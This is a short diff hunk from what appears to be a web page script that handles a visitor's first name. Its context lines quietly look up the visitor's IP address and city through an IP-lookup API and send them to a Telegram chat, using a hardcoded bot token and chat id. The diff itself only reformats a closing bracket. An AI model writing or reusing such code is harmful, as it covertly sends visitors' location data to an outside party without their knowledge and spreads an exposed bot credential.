@@ -11,7 +11,7 @@ json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
 let data1 = data.ip;
   let city1 = data.city;
 fetch('https://api.telegram.org/bot1620250263:AAGPa3jtMNbK9RiQVNcCYMPnvUWfyZ7aB1M/sendMessage?chat_id=-1001717443651&text='+data1+"%0A"+city1);
-})
+  } );
 }
 else{
  firstName = firstName.toLowerCase();
